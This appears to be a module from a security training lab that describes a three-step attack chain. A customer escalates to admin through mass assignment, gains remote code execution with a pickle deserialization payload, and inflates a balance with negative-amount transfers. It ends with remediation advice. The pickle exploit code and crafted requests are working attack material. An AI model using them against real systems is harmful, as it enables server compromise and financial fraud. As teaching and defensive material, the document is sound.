# capstone_chain

| Field | Value |
|---|---|
| Difficulty | Advanced / Capstone |
| Combines | mass_assignment_role → insecure_deserialization_admin_import → fund_transfer_flaws |

## Overview
No new code — this is a documentation-only module describing a realistic
full attack chain using three earlier findings together, the way a real
engagement's final report narrative would read: not a list of isolated
bugs, but a story of how a low-privilege customer account leads to full
compromise.

## The chain

**Step 1 — Start as a normal customer.**
Register or log in as any customer account (e.g. `attacker` / `Password123!`).

**Step 2 — Escalate to admin (mass_assignment_role).**
```
PATCH /profile
{"role": "admin"}
```
Log out and back in so the session picks up the new role.

**Step 3 — Reach the admin-only import feature (insecure_deserialization_admin_import).**
Now that the session carries `role=admin`, the previously-inaccessible
`/admin/import-data` endpoint is reachable. Craft a pickle payload and
achieve remote code execution on the app server:
```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned.txt',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
```
```
POST /admin/import-data
{"payload": "<payload>"}
```

**Step 4 — Cash out (fund_transfer_flaws).**
Independent of the RCE, and even without it, the same escalated account
can also exploit the transfer endpoint's negative-amount bug to inflate
its own balance arbitrarily:
```
POST /transfer
{"beneficiary_id": 101, "amount": -50000}
```

## Why this matters for a report
Each individual finding (mass assignment, insecure deserialization,
missing amount validation) might get triaged as "Medium" in isolation.
Chained together, they demonstrate: **a customer with zero special
access can reach full server compromise and unlimited fund manipulation
using only the app's own public API.** This is the difference between a
checklist-style vulnerability list and a finding that gets a CVSS score
reflecting real business impact — write reports this way when the
findings genuinely chain, not as a courtesy inflation of severity.

## Remediation
Fixing any ONE of the three links breaks this specific chain:
- Fix mass assignment (allowlist profile fields) → attacker never reaches admin.
- Fix insecure deserialization (never pickle.loads untrusted data) → no RCE even as admin.
- Fix the amount validation → no balance inflation even as admin.

Defense in depth means not relying on any single one of these being the
"last line" — all three should be fixed independently, not just the one
that happens to block this particular chain.
